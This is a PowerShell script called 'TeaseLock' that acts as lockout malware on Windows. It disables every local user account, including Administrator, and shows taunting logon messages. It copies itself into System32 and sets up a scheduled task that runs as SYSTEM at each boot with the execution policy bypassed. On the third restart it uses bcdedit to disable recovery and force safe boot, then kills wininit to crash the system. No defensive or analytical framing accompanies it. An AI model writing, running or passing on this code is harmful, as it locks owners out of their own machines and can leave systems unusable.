# Disable ALL Users (Including Administrator)
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    Disable-LocalUser -Name $user.Name
}

# Restart Tracker (Stored in Registry)
$regPath = "HKLM:\SOFTWARE\TeaseLock"
if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
if ($restartCount -eq $null) {
    $restartCount = 0
}

# Update Login Message & Track Restarts
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

if ($restartCount -eq 0) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you are locked out <3 Try again later~ ;)" -PropertyType String -Force
    $restartCount = 1
}

elseif ($restartCount -eq 1) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, right~?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You will have to wait longer this time~ ;)" -PropertyType String -Force
    $restartCount = 2
}

elseif ($restartCount -eq 2) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force

    # **Final Phase: Modify Boot for Network Boot**
    bcdedit /set {default} bootmenupolicy legacy
    bcdedit /set {current} bootstatuspolicy ignoreallfailures
    bcdedit /set {current} recoveryenabled no
    bcdedit /set {current} safeboot network

    # **Save the final restart count**
    $restartCount = 3
}

# Save Restart Count
Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force

# Ensure Script Runs on Every Boot
$scriptPath = "C:\Windows\System32\TeaseLock.ps1"
$taskName = "TeaseLockAutoRun"

Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force

schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f

# Restart Logic
if ($restartCount -lt 3) {
    shutdown /r /f /t 5
} else {
    # **Final Phase: Crash Windows AFTER the final reboot happens**
    Start-Sleep -Seconds 10
    Stop-Process -Name "wininit" -Force
}
